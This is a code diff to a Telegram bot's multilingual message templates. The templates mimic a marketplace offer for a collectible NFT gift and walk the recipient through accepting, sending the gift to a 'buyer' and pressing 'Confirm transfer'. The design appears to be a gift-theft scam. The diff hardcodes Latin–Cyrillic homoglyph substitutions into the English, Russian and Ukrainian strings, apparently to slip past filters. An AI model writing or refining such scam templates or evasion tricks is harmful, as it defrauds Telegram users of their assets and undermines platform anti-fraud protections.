@@ -45,115 +45,96 @@ def em(eid: str, fallback: str) -> str:
     return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>'
 
 
-LAT_TO_CYR = {
-    "A": "А", "a": "а", "C": "С", "c": "с",
-    "E": "Е", "e": "е", "O": "О", "o": "о",
-    "X": "Х", "x": "х",
-}
-CYR_TO_LAT = {v: k for k, v in LAT_TO_CYR.items()}
-
-
-def homoglyphs(text: str, lang: str) -> str:
-    if lang == "ru":
-        table = CYR_TO_LAT
-    elif lang == "eng":
-        table = LAT_TO_CYR
-    else:
-        return text
-    return "".join(table.get(c, c) for c in text)
-
-
 TEXTS = {
     "ru": {
-        "offer_1": "Пoльзοватeль пρeдлагaет вам",
-        "offer_for": "зa кoллeкционный пpедмeт",
-        "offer_time": "Пpeдложeние дeйствyет eще 5 ч. 59 мин..",
-        "offer_fix": "Сдeлкa фикcиpуeтcя кнoпкoй «Пpинять».",
-        "accept_ok": "Успешно продан!",
+        "offer_1":    "Пoльзoвaтeль пpeдлaгaeт вaм",
+        "offer_for":  "зa кoллeкциoнный пpeдмeт",
+        "offer_time": "Пpeдлoжeниe дeйcтвyeт eщё 5 ч. 59 мин.",
+        "offer_fix":  "Сдeлкa фикcиpyeтcя кнoпкoй «Пpинять».",
+        "accept_ok":  "Уcпeшнo пpoдaн!",
         "accept_give": "• Пepeдaйтe пoкyпaтeлю для зaчиcлeния Ѕtarѕ.",
         "accept_then": "Зaтeм нaжмитe «Пoдтвepдить пepeдaчy».",
         "accept_warn": "Кнoпкa cpaбoтaeт тoлькo ecли пoдapoк yжe y пoлyчaтeля.",
         "accept_price": "зa пoдapoк",
-        "order": "Зaкaз",
-        "recipient": "пoлyчaтeль",
+        "order":      "Зaкaз",
+        "recipient":  "пoлyчaтeль",
         "btn_decline": "Oтклoнить",
-        "btn_accept": "Принять",
-        "btn_show": "Пoкaзaть пoдapoк",
-        "btn_give": "Пepeдaть пoдapoк",
-        "btn_confirm": "Пoдтвeрдить пepeдaчy",
-        "declined": "Oффep был oтклoнён.",
+        "btn_accept":  "Пpинять",
+        "btn_show":    "Пoкaзaть пoдapoк",
+        "btn_give":    "Пepeдaть пoдapoк",
+        "btn_confirm": "Пoдтвepдить пepeдaчy",
+        "declined":   "Oффep был oтклoнён.",
         "stars": "Звёзд",
-        "gram": "GRAM",
+        "gram":  "GRAM",
     },
     "ukr": {
-        "offer_1": "Користувач пропонує вам",
-        "offer_for": "за подарунок",
-        "offer_time": "Пропозиція дійсна ще 6 год. 0 хв. 0 сек.",
-        "offer_fix": "Угода фіксується кнопкою «Прийняти».",
-        "accept_ok": "Пропозицію прийнято",
-        "accept_give": "Передайте подарунок",
-        "accept_then": "Потім натисніть «Підтвердити передачу».",
-        "accept_warn": "Кнопка спрацює лише якщо подарунок вже в отримувача.",
-        "accept_price": "за подарунок",
-        "order": "Замовлення",
-        "recipient": "отримувач",
-        "btn_decline": "Відхилити",
-        "btn_accept": "Прийняти",
-        "btn_show": "Показати подарунок",
-        "btn_give": "Передати подарунок",
-        "btn_confirm": "Підтвердити передачу",
-        "declined": "Пропозицію відхилено.",
-        "stars": "Зірок",
-        "gram": "GRAM",
+        "offer_1":    "Кopиcтyвaч пpoпoнyє вaм",
+        "offer_for":  "зa пoдapyнoк",
+        "offer_time": "Пpoпoзицiя дiйcнa щe 6 гoд. 0 хв. 0 ceк.",
+        "offer_fix":  "Угoдa фiкcyєтьcя кнoпкoю «Пpийняти».",
+        "accept_ok":  "Пpoпoзицiю пpийнятo",
+        "accept_give": "Пepeдaйтe пoдapyнoк",
+        "accept_then": "Пoтiм нaтиcнiть «Пiдтвepдити пepeдaчy».",
+        "accept_warn": "Кнoпкa cпpaцює лишe якщo пoдapyнoк вжe в oтpимyвaчa.",
+        "accept_price": "зa пoдapyнoк",
+        "order":      "Зaмoвлeння",
+        "recipient":  "oтpимyвaч",
+        "btn_decline": "Вiдхилити",
+        "btn_accept":  "Пpийняти",
+        "btn_show":    "Пoкaзaти пoдapyнoк",
+        "btn_give":    "Пepeдaти пoдapyнoк",
+        "btn_confirm": "Пiдтвepдити пepeдaчy",
+        "declined":   "Пpoпoзицiю вiдхилeнo.",
+        "stars": "Зipoк",
+        "gram":  "GRAM",
     },
     "eng": {
-        "offer_1": "A user offers you",
-        "offer_for": "for the gift",
-        "offer_time": "The offer is valid for another 6 h. 0 min. 0 sec.",
-        "offer_fix": "The deal is fixed with the «Accept» button.",
-        "accept_ok": "Offer accepted",
-        "accept_give": "Send the gift",
-        "accept_then": "Then press «Confirm transfer».",
-        "accept_warn": "The button works only if the gift is already with the recipient.",
-        "accept_price": "for the gift",
-        "order": "Order",
-        "recipient": "recipient",
+        "offer_1":    "A uѕer оfferѕ yоu",
+        "offer_for":  "fоr the gift",
+        "offer_time": "The оffer iѕ vаlid fоr аnоther 6 h. 0 min. 0 ѕec.",
+        "offer_fix":  "The deаl iѕ fixed with the «Аccept» buttоn.",
+        "accept_ok":  "Оffer аccepted",
+        "accept_give": "Ѕend the gift",
+        "accept_then": "Then preѕѕ «Cоnfirm trаnѕfer».",
+        "accept_warn": "The buttоn wоrkѕ оnly if the gift iѕ аlreаdy with the recipient.",
+        "accept_price": "fоr the gift",
+        "order":      "Оrder",
+        "recipient":  "recipient",
         "btn_decline": "Decline",
-        "btn_accept": "Accept",
-        "btn_show": "Show gift",
-        "btn_give": "Send gift",
-        "btn_confirm": "Confirm transfer",
-        "declined": "The offer was declined.",
-        "stars": "Stars",
-        "gram": "GRAM",
+        "btn_accept":  "Аccept",
+        "btn_show":    "Ѕhоw gift",
+        "btn_give":    "Ѕend gift",
+        "btn_confirm": "Cоnfirm trаnѕfer",
+        "declined":   "The оffer wаѕ declined.",
+        "stars": "Ѕtаrѕ",
+        "gram":  "GRАM",
     },
     "cn": {
-        "offer_1": "用户向您提出报价",
-        "offer_for": "购买礼物",
+        "offer_1":    "用户向您提出报价",
+        "offer_for":  "购买礼物",
         "offer_time": "报价还有效 6 小时 0 分钟 0 秒。",
-        "offer_fix": "交易由「接受」按钮确认。",
-        "accept_ok": "报价已接受",
+        "offer_fix":  "交易由「接受」按钮确认。",
+        "accept_ok":  "报价已接受",
         "accept_give": "请发送礼物",
         "accept_then": "然后点击「确认转账」。",
         "accept_warn": "仅当礼物已在接收者处时按钮才会生效。",
         "accept_price": "购买礼物",
-        "order": "订单",
-        "recipient": "接收者",
+        "order":      "订单",
+        "recipient":  "接收者",
         "btn_decline": "拒绝",
-        "btn_accept": "接受",
-        "btn_show": "显示礼物",
-        "btn_give": "发送礼物",
+        "btn_accept":  "接受",
+        "btn_show":    "显示礼物",
+        "btn_give":    "发送礼物",
         "btn_confirm": "确认转账",
-        "declined": "报价已被拒绝。",
+        "declined":   "报价已被拒绝。",
         "stars": "星",
-        "gram": "GRAM",
+        "gram":  "GRAM",
     },
 }
 
 
 def T(lang, key):
-    text = TEXTS.get(lang, TEXTS["ru"]).get(key, TEXTS["ru"][key])
-    return homoglyphs(text, lang)
+    return TEXTS.get(lang, TEXTS["ru"]).get(key, TEXTS["ru"][key])
 
 
 def parse_command(text):
@@ -225,10 +206,9 @@ def amount_line(amount, currency, lang):
 
 def gift_link_bold(gift_name, gift_num, lang):
     slug = gift_name.replace(" ", "")
-    visible = gift_name if lang == "ru" else homoglyphs(gift_name, lang)
     return (
         f'<b><a href="https://t.me/nft/{slug}-{gift_num}">'
-        f'{visible} #{gift_num}</a></b>'
+        f'{gift_name} #{gift_num}</a></b>'
     )
 
 
@@ -249,7 +229,7 @@ def build_accept_text(amount, currency, gift_name, gift_num, order_id, lang):
         f'{T(lang, "accept_then")}\n'
         f'{T(lang, "accept_warn")}\n\n'
         f'{amount_line(amount, currency, lang)} {T(lang, "accept_price")} '
-        f'{gift_name if lang == "ru" else homoglyphs(gift_name, lang)} #{gift_num}.\n\n'
+        f'{gift_name} #{gift_num}.\n\n'
         f'<i>{T(lang, "order")} #{order_id}, {T(lang, "recipient")} {RECIPIENT}</i>'
     )
 
